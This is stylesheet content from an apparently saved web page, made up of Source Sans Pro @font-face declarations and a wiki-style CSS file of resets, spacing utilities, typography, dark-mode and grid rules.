@font-face { font-family: "Source Sans Pro"; font-style: italic; font-weight: 700; font-display: swap; src: url("https://fonts.gstatic.com/s/sourcesanspro/v21/6xKwdSBYKcSV-LCoeQqfX1RYOo3qPZZclSdi18S0xR41YDw.woff2") format("woff2"); unicode-range: U+100-24F, U+259, U+1E00-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF; }

@font-face { font-family: "Source Sans Pro"; font-style: italic; font-weight: 700; font-display: swap; src: url("https://fonts.gstatic.com/s/sourcesanspro/v21/6xKwdSBYKcSV-LCoeQqfX1RYOo3qPZZclSds18S0xR41.woff2") format("woff2"); unicode-range: U+0-FF, U+131, U+152-153, U+2BB-2BC, U+2C6, U+2DA, U+2DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD; }

@font-face { font-family: "Source Sans Pro"; font-style: italic; font-weight: 900; font-display: swap; src: url("https://fonts.gstatic.com/s/sourcesanspro/v21/6xKwdSBYKcSV-LCoeQqfX1RYOo3qPZZklydh18S0xR41YDw.woff2") format("woff2"); unicode-range: U+460-52F, U+1C80-1C88, U+20B4, U+2DE0-2DFF, U+A640-A69F, U+FE2E-FE2F; }

@font-face { font-family: "Source Sans Pro"; font-style: italic; font-weight: 900; font-display: swap; src: url("https://fonts.gstatic.com/s/sourcesanspro/v21/6xKwdSBYKcSV-LCoeQqfX1RYOo3qPZZklydo18S0xR41YDw.woff2") format("woff2"); unicode-range: U+301, U+400-45F, U+490-491, U+4B0-4B1, U+2116; }

@font-face { font-family: "Source Sans Pro"; font-style: italic; font-weight: 900; font-display: swap; src: url("https://fonts.gstatic.com/s/sourcesanspro/v21/6xKwdSBYKcSV-LCoeQqfX1RYOo3qPZZklydg18S0xR41YDw.woff2") format("woff2"); unicode-range: U+1F00-1FFF; }

@font-face { font-family: "Source Sans Pro"; font-style: italic; font-weight: 900; font-display: swap; src: url("https://fonts.gstatic.com/s/sourcesanspro/v21/6xKwdSBYKcSV-LCoeQqfX1RYOo3qPZZklydv18S0xR41YDw.woff2") format("woff2"); unicode-range: U+370-3FF; }

@font-face { font-family: "Source Sans Pro"; font-style: italic; font-weight: 900; font-display: swap; src: url("https://fonts.gstatic.com/s/sourcesanspro/v21/6xKwdSBYKcSV-LCoeQqfX1RYOo3qPZZklydj18S0xR41YDw.woff2") format("woff2"); unicode-range: U+102-103, U+110-111, U+128-129, U+168-169, U+1A0-1A1, U+1AF-1B0, U+1EA0-1EF9, U+20AB; }

@font-face { font-family: "Source Sans Pro"; font-style: italic; font-weight: 900; font-display: swap; src: url("https://fonts.gstatic.com/s/sourcesanspro/v21/6xKwdSBYKcSV-LCoeQqfX1RYOo3qPZZklydi18S0xR41YDw.woff2") format("woff2"); unicode-range: U+100-24F, U+259, U+1E00-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF; }

@font-face { font-family: "Source Sans Pro"; font-style: italic; font-weight: 900; font-display: swap; src: url("https://fonts.gstatic.com/s/sourcesanspro/v21/6xKwdSBYKcSV-LCoeQqfX1RYOo3qPZZklyds18S0xR41.woff2") format("woff2"); unicode-range: U+0-FF, U+131, U+152-153, U+2BB-2BC, U+2C6, U+2DA, U+2DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD; }

@font-face { font-family: "Source Sans Pro"; font-style: normal; font-weight: 400; font-display: swap; src: url("https://fonts.gstatic.com/s/sourcesanspro/v21/6xK3dSBYKcSV-LCoeQqfX1RYOo3qNa7lujVj9_mf.woff2") format("woff2"); unicode-range: U+460-52F, U+1C80-1C88, U+20B4, U+2DE0-2DFF, U+A640-A69F, U+FE2E-FE2F; }

@font-face { font-family: "Source Sans Pro"; font-style: normal; font-weight: 400; font-display: swap; src: url("https://fonts.gstatic.com/s/sourcesanspro/v21/6xK3dSBYKcSV-LCoeQqfX1RYOo3qPK7lujVj9_mf.woff2") format("woff2"); unicode-range: U+301, U+400-45F, U+490-491, U+4B0-4B1, U+2116; }

@font-face { font-family: "Source Sans Pro"; font-style: normal; font-weight: 400; font-display: swap; src: url("https://fonts.gstatic.com/s/sourcesanspro/v21/6xK3dSBYKcSV-LCoeQqfX1RYOo3qNK7lujVj9_mf.woff2") format("woff2"); unicode-range: U+1F00-1FFF; }

@font-face { font-family: "Source Sans Pro"; font-style: normal; font-weight: 400; font-display: swap; src: url("https://fonts.gstatic.com/s/sourcesanspro/v21/6xK3dSBYKcSV-LCoeQqfX1RYOo3qO67lujVj9_mf.woff2") format("woff2"); unicode-range: U+370-3FF; }

@font-face { font-family: "Source Sans Pro"; font-style: normal; font-weight: 400; font-display: swap; src: url("https://fonts.gstatic.com/s/sourcesanspro/v21/6xK3dSBYKcSV-LCoeQqfX1RYOo3qN67lujVj9_mf.woff2") format("woff2"); unicode-range: U+102-103, U+110-111, U+128-129, U+168-169, U+1A0-1A1, U+1AF-1B0, U+1EA0-1EF9, U+20AB; }

@font-face { font-family: "Source Sans Pro"; font-style: normal; font-weight: 400; font-display: swap; src: url("https://fonts.gstatic.com/s/sourcesanspro/v21/6xK3dSBYKcSV-LCoeQqfX1RYOo3qNq7lujVj9_mf.woff2") format("woff2"); unicode-range: U+100-24F, U+259, U+1E00-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF; }

@font-face { font-family: "Source Sans Pro"; font-style: normal; font-weight: 400; font-display: swap; src: url("https://fonts.gstatic.com/s/sourcesanspro/v21/6xK3dSBYKcSV-LCoeQqfX1RYOo3qOK7lujVj9w.woff2") format("woff2"); unicode-range: U+0-FF, U+131, U+152-153, U+2BB-2BC, U+2C6, U+2DA, U+2DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD; }

@font-face { font-family: "Source Sans Pro"; font-style: normal; font-weight: 600; font-display: swap; src: url("https://fonts.gstatic.com/s/sourcesanspro/v21/6xKydSBYKcSV-LCoeQqfX1RYOo3i54rwmhdu3cOWxy40.woff2") format("woff2"); unicode-range: U+460-52F, U+1C80-1C88, U+20B4, U+2DE0-2DFF, U+A640-A69F, U+FE2E-FE2F; }

@font-face { font-family: "Source Sans Pro"; font-style: normal; font-weight: 600; font-display: swap; src: url("https://fonts.gstatic.com/s/sourcesanspro/v21/6xKydSBYKcSV-LCoeQqfX1RYOo3i54rwkxdu3cOWxy40.woff2") format("woff2"); unicode-range: U+301, U+400-45F, U+490-491, U+4B0-4B1, U+2116; }

@font-face { font-family: "Source Sans Pro"; font-style: normal; font-weight: 600; font-display: swap; src: url("https://fonts.gstatic.com/s/sourcesanspro/v21/6xKydSBYKcSV-LCoeQqfX1RYOo3i54rwmxdu3cOWxy40.woff2") format("woff2"); unicode-range: U+1F00-1FFF; }

@font-face { font-family: "Source Sans Pro"; font-style: normal; font-weight: 600; font-display: swap; src: url("https://fonts.gstatic.com/s/sourcesanspro/v21/6xKydSBYKcSV-LCoeQqfX1RYOo3i54rwlBdu3cOWxy40.woff2") format("woff2"); unicode-range: U+370-3FF; }

@font-face { font-family: "Source Sans Pro"; font-style: normal; font-weight: 600; font-display: swap; src: url("https://fonts.gstatic.com/s/sourcesanspro/v21/6xKydSBYKcSV-LCoeQqfX1RYOo3i54rwmBdu3cOWxy40.woff2") format("woff2"); unicode-range: U+102-103, U+110-111, U+128-129, U+168-169, U+1A0-1A1, U+1AF-1B0, U+1EA0-1EF9, U+20AB; }

@font-face { font-family: "Source Sans Pro"; font-style: normal; font-weight: 600; font-display: swap; src: url("https://fonts.gstatic.com/s/sourcesanspro/v21/6xKydSBYKcSV-LCoeQqfX1RYOo3i54rwmRdu3cOWxy40.woff2") format("woff2"); unicode-range: U+100-24F, U+259, U+1E00-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF; }

@font-face { font-family: "Source Sans Pro"; font-style: normal; font-weight: 600; font-display: swap; src: url("https://fonts.gstatic.com/s/sourcesanspro/v21/6xKydSBYKcSV-LCoeQqfX1RYOo3i54rwlxdu3cOWxw.woff2") format("woff2"); unicode-range: U+0-FF, U+131, U+152-153, U+2BB-2BC, U+2C6, U+2DA, U+2DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD; }

@font-face { font-family: "Source Sans Pro"; font-style: normal; font-weight: 700; font-display: swap; src: url("https://fonts.gstatic.com/s/sourcesanspro/v21/6xKydSBYKcSV-LCoeQqfX1RYOo3ig4vwmhdu3cOWxy40.woff2") format("woff2"); unicode-range: U+460-52F, U+1C80-1C88, U+20B4, U+2DE0-2DFF, U+A640-A69F, U+FE2E-FE2F; }

@font-face { font-family: "Source Sans Pro"; font-style: normal; font-weight: 700; font-display: swap; src: url("https://fonts.gstatic.com/s/sourcesanspro/v21/6xKydSBYKcSV-LCoeQqfX1RYOo3ig4vwkxdu3cOWxy40.woff2") format("woff2"); unicode-range: U+301, U+400-45F, U+490-491, U+4B0-4B1, U+2116; }

@font-face { font-family: "Source Sans Pro"; font-style: normal; font-weight: 700; font-display: swap; src: url("https://fonts.gstatic.com/s/sourcesanspro/v21/6xKydSBYKcSV-LCoeQqfX1RYOo3ig4vwmxdu3cOWxy40.woff2") format("woff2"); unicode-range: U+1F00-1FFF; }

@font-face { font-family: "Source Sans Pro"; font-style: normal; font-weight: 700; font-display: swap; src: url("https://fonts.gstatic.com/s/sourcesanspro/v21/6xKydSBYKcSV-LCoeQqfX1RYOo3ig4vwlBdu3cOWxy40.woff2") format("woff2"); unicode-range: U+370-3FF; }

@font-face { font-family: "Source Sans Pro"; font-style: normal; font-weight: 700; font-display: swap; src: url("https://fonts.gstatic.com/s/sourcesanspro/v21/6xKydSBYKcSV-LCoeQqfX1RYOo3ig4vwmBdu3cOWxy40.woff2") format("woff2"); unicode-range: U+102-103, U+110-111, U+128-129, U+168-169, U+1A0-1A1, U+1AF-1B0, U+1EA0-1EF9, U+20AB; }

@font-face { font-family: "Source Sans Pro"; font-style: normal; font-weight: 700; font-display: swap; src: url("https://fonts.gstatic.com/s/sourcesanspro/v21/6xKydSBYKcSV-LCoeQqfX1RYOo3ig4vwmRdu3cOWxy40.woff2") format("woff2"); unicode-range: U+100-24F, U+259, U+1E00-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF; }

@font-face { font-family: "Source Sans Pro"; font-style: normal; font-weight: 700; font-display: swap; src: url("https://fonts.gstatic.com/s/sourcesanspro/v21/6xKydSBYKcSV-LCoeQqfX1RYOo3ig4vwlxdu3cOWxw.woff2") format("woff2"); unicode-range: U+0-FF, U+131, U+152-153, U+2BB-2BC, U+2C6, U+2DA, U+2DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD; }

@font-face { font-family: "Source Sans Pro"; font-style: normal; font-weight: 900; font-display: swap; src: url("https://fonts.gstatic.com/s/sourcesanspro/v21/6xKydSBYKcSV-LCoeQqfX1RYOo3iu4nwmhdu3cOWxy40.woff2") format("woff2"); unicode-range: U+460-52F, U+1C80-1C88, U+20B4, U+2DE0-2DFF, U+A640-A69F, U+FE2E-FE2F; }

@font-face { font-family: "Source Sans Pro"; font-style: normal; font-weight: 900; font-display: swap; src: url("https://fonts.gstatic.com/s/sourcesanspro/v21/6xKydSBYKcSV-LCoeQqfX1RYOo3iu4nwkxdu3cOWxy40.woff2") format("woff2"); unicode-range: U+301, U+400-45F, U+490-491, U+4B0-4B1, U+2116; }

@font-face { font-family: "Source Sans Pro"; font-style: normal; font-weight: 900; font-display: swap; src: url("https://fonts.gstatic.com/s/sourcesanspro/v21/6xKydSBYKcSV-LCoeQqfX1RYOo3iu4nwmxdu3cOWxy40.woff2") format("woff2"); unicode-range: U+1F00-1FFF; }

@font-face { font-family: "Source Sans Pro"; font-style: normal; font-weight: 900; font-display: swap; src: url("https://fonts.gstatic.com/s/sourcesanspro/v21/6xKydSBYKcSV-LCoeQqfX1RYOo3iu4nwlBdu3cOWxy40.woff2") format("woff2"); unicode-range: U+370-3FF; }

@font-face { font-family: "Source Sans Pro"; font-style: normal; font-weight: 900; font-display: swap; src: url("https://fonts.gstatic.com/s/sourcesanspro/v21/6xKydSBYKcSV-LCoeQqfX1RYOo3iu4nwmBdu3cOWxy40.woff2") format("woff2"); unicode-range: U+102-103, U+110-111, U+128-129, U+168-169, U+1A0-1A1, U+1AF-1B0, U+1EA0-1EF9, U+20AB; }

@font-face { font-family: "Source Sans Pro"; font-style: normal; font-weight: 900; font-display: swap; src: url("https://fonts.gstatic.com/s/sourcesanspro/v21/6xKydSBYKcSV-LCoeQqfX1RYOo3iu4nwmRdu3cOWxy40.woff2") format("woff2"); unicode-range: U+100-24F, U+259, U+1E00-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF; }

@font-face { font-family: "Source Sans Pro"; font-style: normal; font-weight: 900; font-display: swap; src: url("https://fonts.gstatic.com/s/sourcesanspro/v21/6xKydSBYKcSV-LCoeQqfX1RYOo3iu4nwlxdu3cOWxw.woff2") format("woff2"); unicode-range: U+0-FF, U+131, U+152-153, U+2BB-2BC, U+2C6, U+2DA, U+2DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD; }
------MultipartBoundary--sKM9b8t92hmyOIGZu7GY7eQCEIcQtcXvFi8Hovc04b----
Content-Type: text/css
Content-Transfer-Encoding: binary
Content-Location: https://hideandsec.sh/dist/styles.css?version=v21.08.3

@charset "utf-8";

html, body, div, span, applet, object, iframe, h1, h2, h3, h4, h5, h6, p, blockquote, pre, a, abbr, acronym, address, big, cite, code, del, dfn, em, img, ins, kbd, q, s, samp, small, strike, strong, sub, sup, tt, var, b, u, i, center, dl, dt, dd, ol, ul, li, fieldset, form, label, legend, table, caption, tbody, tfoot, thead, tr, th, td, article, aside, canvas, details, embed, figure, figcaption, footer, header, hgroup, menu, nav, output, ruby, section, summary, time, mark, audio, video { margin: 0px; padding: 0px; border: 0px; font: inherit; vertical-align: baseline; }

article, aside, details, figcaption, figure, footer, header, hgroup, menu, nav, section { display: block; }

body { line-height: 1; }

ol, ul { list-style: none; }

blockquote, q { quotes: none; }

blockquote::before, blockquote::after { content: none; }

q::before, q::after { content: none; }

table { border-collapse: collapse; border-spacing: 0px; }

:root { --color-primary: #206ea7; --color-primary-light: rgba(32,110,167,0.15); --color-page: #206ea7; --color-page-draft: #7e50b1; --color-chapter: #af4d0d; --color-book: #077b70; --color-bookshelf: #a94747; }

.m-none { margin: 0px !important; }

.mx-none { margin-inline: 0px !important; }

.my-none { margin-top: 0px !important; margin-bottom: 0px !important; }

.mt-none { margin-top: 0px !important; }

.mr-none { margin-inline-end: 0px !important; }

.mb-none { margin-bottom: 0px !important; }

.ml-none { margin-inline-start: 0px !important; }

.m-xxs { margin: 3px !important; }

.mx-xxs { margin-inline: 3px !important; }

.my-xxs { margin-top: 3px !important; margin-bottom: 3px !important; }

.mt-xxs { margin-top: 3px !important; }

.mr-xxs { margin-inline-end: 3px !important; }

.mb-xxs { margin-bottom: 3px !important; }

.ml-xxs { margin-inline-start: 3px !important; }

.m-xs { margin: 6px !important; }

.mx-xs { margin-inline: 6px !important; }

.my-xs { margin-top: 6px !important; margin-bottom: 6px !important; }

.mt-xs { margin-top: 6px !important; }

.mr-xs { margin-inline-end: 6px !important; }

.mb-xs { margin-bottom: 6px !important; }

.ml-xs { margin-inline-start: 6px !important; }

.m-s { margin: 12px !important; }

.mx-s { margin-inline: 12px !important; }

.my-s { margin-top: 12px !important; margin-bottom: 12px !important; }

.mt-s { margin-top: 12px !important; }

.mr-s { margin-inline-end: 12px !important; }

.mb-s { margin-bottom: 12px !important; }

.ml-s { margin-inline-start: 12px !important; }

.m-m { margin: 16px !important; }

.mx-m { margin-inline: 16px !important; }

.my-m { margin-top: 16px !important; margin-bottom: 16px !important; }

.mt-m { margin-top: 16px !important; }

.mr-m { margin-inline-end: 16px !important; }

.mb-m { margin-bottom: 16px !important; }

.ml-m { margin-inline-start: 16px !important; }

.m-l { margin: 24px !important; }

.mx-l { margin-inline: 24px !important; }

.my-l { margin-top: 24px !important; margin-bottom: 24px !important; }

.mt-l { margin-top: 24px !important; }

.mr-l { margin-inline-end: 24px !important; }

.mb-l { margin-bottom: 24px !important; }

.ml-l { margin-inline-start: 24px !important; }

.m-xl { margin: 32px !important; }

.mx-xl { margin-inline: 32px !important; }

.my-xl { margin-top: 32px !important; margin-bottom: 32px !important; }

.mt-xl { margin-top: 32px !important; }

.mr-xl { margin-inline-end: 32px !important; }

.mb-xl { margin-bottom: 32px !important; }

.ml-xl { margin-inline-start: 32px !important; }

.m-xxl { margin: 48px !important; }

.mx-xxl { margin-inline: 48px !important; }

.my-xxl { margin-top: 48px !important; margin-bottom: 48px !important; }

.mt-xxl { margin-top: 48px !important; }

.mr-xxl { margin-inline-end: 48px !important; }

.mb-xxl { margin-bottom: 48px !important; }

.ml-xxl { margin-inline-start: 48px !important; }

.m-auto { margin: auto !important; }

.mx-auto { margin-inline: auto !important; }

.my-auto { margin-top: auto !important; margin-bottom: auto !important; }

.mt-auto { margin-top: auto !important; }

.mr-auto { margin-inline-end: auto !important; }

.mb-auto { margin-bottom: auto !important; }

.ml-auto { margin-inline-start: auto !important; }

.p-none { padding: 0px !important; }

.px-none { padding-inline: 0px !important; }

.py-none { padding-top: 0px !important; padding-bottom: 0px !important; }

.pt-none { padding-top: 0px !important; }

.pr-none { padding-inline-end: 0px !important; }

.pb-none { padding-bottom: 0px !important; }

.pl-none { padding-inline-start: 0px !important; }

.p-xxs { padding: 3px !important; }

.px-xxs { padding-inline: 3px !important; }

.py-xxs { padding-top: 3px !important; padding-bottom: 3px !important; }

.pt-xxs { padding-top: 3px !important; }

.pr-xxs { padding-inline-end: 3px !important; }

.pb-xxs { padding-bottom: 3px !important; }

.pl-xxs { padding-inline-start: 3px !important; }

.p-xs { padding: 6px !important; }

.px-xs { padding-inline: 6px !important; }

.py-xs { padding-top: 6px !important; padding-bottom: 6px !important; }

.pt-xs { padding-top: 6px !important; }

.pr-xs { padding-inline-end: 6px !important; }

.pb-xs { padding-bottom: 6px !important; }

.pl-xs { padding-inline-start: 6px !important; }

.p-s { padding: 12px !important; }

.px-s { padding-inline: 12px !important; }

.py-s { padding-top: 12px !important; padding-bottom: 12px !important; }

.pt-s { padding-top: 12px !important; }

.pr-s { padding-inline-end: 12px !important; }

.pb-s { padding-bottom: 12px !important; }

.pl-s { padding-inline-start: 12px !important; }

.p-m { padding: 16px !important; }

.px-m { padding-inline: 16px !important; }

.py-m { padding-top: 16px !important; padding-bottom: 16px !important; }

.pt-m { padding-top: 16px !important; }

.pr-m { padding-inline-end: 16px !important; }

.pb-m { padding-bottom: 16px !important; }

.pl-m { padding-inline-start: 16px !important; }

.p-l { padding: 24px !important; }

.px-l { padding-inline: 24px !important; }

.py-l { padding-top: 24px !important; padding-bottom: 24px !important; }

.pt-l { padding-top: 24px !important; }

.pr-l { padding-inline-end: 24px !important; }

.pb-l { padding-bottom: 24px !important; }

.pl-l { padding-inline-start: 24px !important; }

.p-xl { padding: 32px !important; }

.px-xl { padding-inline: 32px !important; }

.py-xl { padding-top: 32px !important; padding-bottom: 32px !important; }

.pt-xl { padding-top: 32px !important; }

.pr-xl { padding-inline-end: 32px !important; }

.pb-xl { padding-bottom: 32px !important; }

.pl-xl { padding-inline-start: 32px !important; }

.p-xxl { padding: 48px !important; }

.px-xxl { padding-inline: 48px !important; }

.py-xxl { padding-top: 48px !important; padding-bottom: 48px !important; }

.pt-xxl { padding-top: 48px !important; }

.pr-xxl { padding-inline-end: 48px !important; }

.pb-xxl { padding-bottom: 48px !important; }

.pl-xxl { padding-inline-start: 48px !important; }

.p-auto { }

.px-auto { }

.py-auto { }

.pt-auto { }

.pr-auto { }

.pb-auto { }

.pl-auto { }

* { box-sizing: border-box; outline-color: var(--color-primary); outline-width: 1px; }

:focus { outline-style: dotted; }

html { height: 100%; overflow-y: scroll; background-color: rgb(242, 242, 242); }

html.flexbox { overflow-y: hidden; }

html.dark-mode { background-color: rgb(17, 17, 17); }

body { font-size: 14px; line-height: 1.6; color: rgb(68, 68, 68); -webkit-font-smoothing: antialiased; height: 100%; display: flex; flex-direction: column; }

html.dark-mode body { color: rgb(170, 170, 170); }

body, button, input, select, label, textarea { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Oxygen, Ubuntu, Roboto, Cantarell, "Fira Sans", "Droid Sans", "Helvetica Neue", sans-serif; }

.Codemirror, pre, #markdown-editor-input, .editor-toolbar, .code-base, span.code, code { font-family: "Lucida Console", "DejaVu Sans Mono", "Ubuntu Mono", Monaco, monospace; }

h1 { font-size: 3.425em; line-height: 1.22222em; margin-top: 0.488889em; margin-bottom: 0.488889em; }

h2 { font-size: 2.8275em; line-height: 1.29412em; margin-top: 0.862745em; margin-bottom: 0.431373em; }

h3 { font-size: 2.333em; line-height: 1.22143em; margin-top: 0.785714em; margin-bottom: 0.431373em; }

h4 { font-size: 1.666em; line-height: 1.375em; margin-top: 0.785714em; margin-bottom: 0.431373em; }

h1, h2, h3, h4, h5, h6 { font-weight: 400; position: relative; display: block; color: rgb(34, 34, 34); }

html.dark-mode h1, html.dark-mode h2, html.dark-mode h3, html.dark-mode h4, html.dark-mode h5, html.dark-mode h6 { color: rgb(187, 187, 187); }

h1 .subheader, h2 .subheader, h3 .subheader, h4 .subheader, h5 .subheader, h6 .subheader { font-size: 0.5em; line-height: 1em; color: rgb(150, 150, 150); }

h5 { font-size: 1.4em; }

h5, h6 { line-height: 1.2em; margin-top: 0.785714em; margin-bottom: 0.66em; }

@media screen and (max-width: 600px) {
  h1 { font-size: 2.8275em; }
  h2 { font-size: 2.333em; }
  h3 { font-size: 1.666em; }
  h4 { font-size: 1.333em; }
  h5 { font-size: 1.16162em; }
}

.list-heading { font-size: 2rem; }

h2.list-heading { font-size: 1.333rem; }

a { color: var(--color-primary); fill: currentcolor; cursor: pointer; text-decoration: none; transition: filter 80ms ease-in-out 0s; line-height: 1.6; }

a:hover { text-decoration: underline; }

a.icon { display: inline-block; }

a svg { position: relative; display: inline-block; }

a:focus img:only-child { outline: 2px dashed var(--color-primary); outline-offset: 2px; }

a.no-link-style { color: inherit; }

a.no-link-style:hover { text-decoration: none; }

.blended-links a { color: inherit; }

.blended-links a svg { fill: currentcolor; }

p, ul, ol, pre, table, blockquote { margin-top: 0.3em; margin-bottom: 1.375em; }

hr { border: 0px; height: 1px; background: rgb(234, 234, 234); margin-bottom: 24px; }

html.dark-mode hr { background: rgb(85, 85, 85); }

hr.faded { background-image: linear-gradient(to right, rgb(255, 255, 255), rgb(227, 224, 224) 20%, rgb(227, 224, 224) 80%, rgb(255, 255, 255)); }

hr.darker { background: rgb(221, 221, 221); }

html.dark-mode hr.darker { background: rgb(102, 102, 102); }

hr.margin-top, hr.even { margin-top: 24px; }

strong, b, .bold, .strong { font-weight: bold; }

strong > strong, strong > b, strong > .bold, strong > .strong, b > strong, b > b, b > .bold, b > .strong, .bold > strong, .bold > b, .bold > .bold, .bold > .strong, .strong > strong, .strong > b, .strong > .bold, .strong > .strong { font-weight: bolder; }

em, i, .italic { font-style: italic; }

small, p.small, span.small, .text-small { font-size: 0.75rem; color: rgb(94, 94, 94); }

html.dark-mode small, html.dark-mode p.small, html.dark-mode span.small, html.dark-mode .text-small { color: rgb(153, 153, 153); }

sup, .superscript { vertical-align: super; font-size: 0.8em; }

sub, .subscript { vertical-align: sub; font-size: 0.8em; }

pre { font-size: 12px; border: 1px solid rgb(221, 221, 221); background-color: rgb(245, 245, 245); padding-left: 31px; position: relative; padding-top: 3px; padding-bottom: 3px; }

html.dark-mode pre { background-color: rgb(43, 43, 43); }

html.dark-mode pre { border-color: rgb(17, 17, 17); }

pre::after { content: ""; display: block; position: absolute; top: 0px; width: 29px; left: 0px; height: 100%; background-color: rgb(245, 245, 245); border-right: 1px solid rgb(221, 221, 221); }

html.dark-mode pre::after { background-color: rgb(49, 51, 53); }

html.dark-mode pre::after { border-right: none; }

@media print {
  pre { padding-left: 12px; }
  pre::after { display: none; }
}

blockquote { display: block; position: relative; border-left: 4px solid var(--color-primary); background-color: rgb(248, 248, 248); padding: 12px 16px 12px 32px; overflow: auto; }

html.dark-mode blockquote { background-color: rgb(51, 51, 51); }

blockquote::before { content: ""; font-size: 2em; font-weight: bold; position: absolute; top: 12px; left: 12px; color: rgb(119, 119, 119); }

.text-mono { font-family: "Lucida Console", "DejaVu Sans Mono", "Ubuntu Mono", Monaco, monospace; }

.text-uppercase { text-transform: uppercase; }

.text-capitals { text-transform: capitalize; }

.code-base, span.code, code { font-size: 0.84em; border: 1px solid rgb(221, 221, 221); border-radius: 3px; background-color: rgb(248, 248, 248); }

html.dark-mode .code-base, html.dark-mode span.code, html.dark-mode code { background-color: rgb(43, 43, 43); }

html.dark-mode .code-base, html.dark-mode span.code, html.dark-mode code { border-color: rgb(68, 68, 68); }

code { display: inline; padding: 1px 3px; white-space: pre-wrap; line-height: 1.2em; }

span.code { padding: 1px 6px; }

pre code { background-color: transparent; border: 0px; font-size: 1em; display: block; line-height: 1.6; }

span.highlight { font-weight: bold; padding: 2px 4px; }

ul p, ol p { margin: 0px; }

ul { list-style: disc; }

ul ul { list-style: circle; }

ul label { margin: 0px; }

ol { list-style: decimal; }

ol, ul { padding-left: 32px; padding-right: 32px; }

li > ol, li > ul { margin-top: 0px; margin-bottom: 0px; margin-block: 0px; padding-block: 0px; padding-left: 19.2px; padding-right: 19.2px; }

li.checkbox-item, li.task-list-item { list-style: none; margin-left: -19.2px; }

li.checkbox-item input[type="checkbox"], li.task-list-item input[type="checkbox"] { margin-right: 6px; }

li.checkbox-item li.checkbox-item, li.checkbox-item li.task-list-item, li.task-list-item li.checkbox-item, li.task-list-item li.task-list-item { margin-left: 6px; }

.underlined { text-decoration: underline; }

.text-center { text-align: center; }

.text-left { text-align: start; }

.text-right { text-align: end; }

@media screen and (min-width: 360px) {
  .text-xxs-center { text-align: center; }
  .text-xxs-left { text-align: start; }
  .text-xxs-right { text-align: end; }
}

@media screen and (min-width: 400px) {
  .text-xs-center { text-align: center; }
  .text-xs-left { text-align: start; }
  .text-xs-right { text-align: end; }
}

@media screen and (min-width: 600px) {
  .text-s-center { text-align: center; }
  .text-s-left { text-align: start; }
  .text-s-right { text-align: end; }
}

@media screen and (min-width: 880px) {
  .text-m-center { text-align: center; }
  .text-m-left { text-align: start; }
  .text-m-right { text-align: end; }
}

@media screen and (min-width: 1000px) {
  .text-l-center { text-align: center; }
  .text-l-left { text-align: start; }
  .text-l-right { text-align: end; }
}

@media screen and (min-width: 1100px) {
  .text-xl-center { text-align: center; }
  .text-xl-left { text-align: start; }
  .text-xl-right { text-align: end; }
}

.text-bigger { font-size: 1.1em; }

.text-large { font-size: 1.6666em; }

.no-color { color: inherit; }

.break-text { overflow-wrap: break-word; }

.text-limit-lines-1 { white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }

.text-limit-lines-2 { display: -webkit-box; -webkit-box-orient: vertical; -webkit-line-clamp: 2; overflow: hidden; }

.header-group { margin: 16px 0px; }

.header-group h1, .header-group h2, .header-group h3, .header-group h4, .header-group h5, .header-group h6 { margin: 0px; }

span.sep { color: rgb(187, 187, 187); padding: 0px 6px; }

.list > * { display: block; }

.svg-icon { width: 1em; height: 1em; display: inline-block; position: relative; bottom: -0.105em; margin-inline-end: 6px; pointer-events: none; fill: currentcolor; }

.primary-background { background-color: var(--color-primary)  !important; }

.primary-background-light { background-color: var(--color-primary-light); }

html.dark-mode .primary-background-light { background: rgb(0, 0, 0); }

html.dark-mode .primary-background-light .text-primary { color: rgb(170, 170, 170) !important; }

.text-pos, .text-pos:hover, .text-pos-hover:hover { color: rgb(15, 125, 21) !important; fill: rgb(15, 125, 21) !important; }

.text-warn, .text-warn:hover, .text-warn-hover:hover { color: rgb(207, 77, 3) !important; fill: rgb(207, 77, 3) !important; }

.text-neg, .text-neg:hover, .text-neg-hover:hover { color: rgb(171, 15, 14) !important; fill: rgb(171, 15, 14) !important; }

.text-primary, .text-primary:hover, .text-primary-hover:hover { color: var(--color-primary)  !important; fill: var(--color-primary)  !important; }

.text-muted { color: rgb(87, 87, 87) !important; fill: currentcolor !important; }

html.dark-mode .text-muted { color: rgb(136, 136, 136) !important; }

.text-dark { color: rgb(34, 34, 34) !important; fill: currentcolor !important; }

html.dark-mode .text-dark { color: rgb(204, 204, 204) !important; }

.text-white { color: rgb(255, 255, 255); fill: currentcolor !important; }

.text-bookshelf, .text-bookshelf:hover { color: var(--color-bookshelf); fill: var(--color-bookshelf); }

.text-book, .text-book:hover { color: var(--color-book); fill: var(--color-book); }

.text-page, .text-page:hover { color: var(--color-page); fill: var(--color-page); }

.text-page.draft, .text-page.draft:hover { color: var(--color-page-draft); fill: var(--color-page-draft); }

.text-chapter, .text-chapter:hover { color: var(--color-chapter); fill: var(--color-chapter); }

.bg-white { background-color: rgb(255, 255, 255); }

.bg-book { background-color: var(--color-book); }

.bg-chapter { background-color: var(--color-chapter); }

.bg-bookshelf { background-color: var(--color-bookshelf); }

.container { max-width: 1400px; margin-inline: auto; padding-inline: 16px; }

.container.small { max-width: 840px; }

.container.very-small { max-width: 480px; }

.grid { display: grid; gap: 24px; }

.grid.half { grid-template-columns: 1fr 1fr; }

.grid.third { grid-template-columns: 1fr 1fr 1fr; }

.grid.left-focus { grid-template-columns: 2fr 1fr; }
